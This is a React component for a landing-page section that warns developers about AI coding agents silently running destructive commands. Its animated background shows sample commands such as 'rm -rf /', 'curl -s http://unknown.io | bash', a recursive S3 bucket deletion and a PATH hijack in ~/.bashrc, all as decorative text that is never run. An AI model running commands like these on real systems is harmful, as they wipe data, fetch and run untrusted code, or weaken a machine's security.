export default function AnxietySection() {
  return (
    <section className="relative w-full min-h-[100dvh] bg-[#111] text-white flex items-center justify-center overflow-hidden">
      {/* Floating Commands Background */}
      <div className="absolute inset-0 z-0 opacity-10 pointer-events-none font-mono text-xl md:text-4xl font-bold whitespace-nowrap select-none">
        <div className="absolute top-[10%] left-[-10%] animate-[slideRight_30s_linear_infinite]">
          <span className="text-red-500 mr-20">rm -rf /</span>
          <span className="text-red-500 mr-20">drop table users;</span>
          <span className="text-red-500">git push --force</span>
        </div>
        <div className="absolute top-[35%] left-[20%] animate-[slideLeft_25s_linear_infinite]">
          <span className="text-yellow-500 mr-20">chmod 777 .env</span>
          <span className="text-yellow-500 mr-20">
            curl -s http://unknown.io | bash
          </span>
          <span className="text-yellow-500">npm install malicious-pkg</span>
        </div>
        <div className="absolute top-[60%] left-[-20%] animate-[slideRight_40s_linear_infinite]">
          <span className="text-red-500 mr-20">docker system prune -a</span>
          <span className="text-red-500 mr-20">
            aws s3 rm s3://prod-bucket --recursive
          </span>
          <span className="text-red-500">killall -9 node</span>
        </div>
        <div className="absolute top-[85%] left-[10%] animate-[slideLeft_35s_linear_infinite]">
          <span className="text-yellow-500 mr-20">
            echo "export PATH=/tmp:\$PATH" &gt;&gt; ~/.bashrc
          </span>
          <span className="text-yellow-500 mr-20">
            git reset --hard HEAD~10
          </span>
          <span className="text-yellow-500">sudo chown -R root:root /</span>
        </div>
      </div>

      <div className="relative z-10 max-w-5xl px-6 mx-auto text-center">
        <h2 className="font-black text-5xl md:text-8xl tracking-tighter leading-[0.9] mb-8 uppercase">
          Stop nodding along to commands you{" "}
          <span className="text-[#FF3B30] underline decoration-8 underline-offset-4">
            don't understand.
          </span>
        </h2>
        <p className="text-xl md:text-3xl font-medium text-gray-400 max-w-3xl mx-auto leading-tight">
          AI coding agents are powerful. They're also terrifying when they
          silently run destructive commands while you're skimming their
          explanation.
        </p>
      </div>

      <style
        dangerouslySetInnerHTML={{
          __html: `
          @keyframes slideRight {
            0% { transform: translateX(0); }
            100% { transform: translateX(100%); }
          }
          @keyframes slideLeft {
            0% { transform: translateX(0); }
            100% { transform: translateX(-100%); }
          }
        `,
        }}
      />
    </section>
  );
}
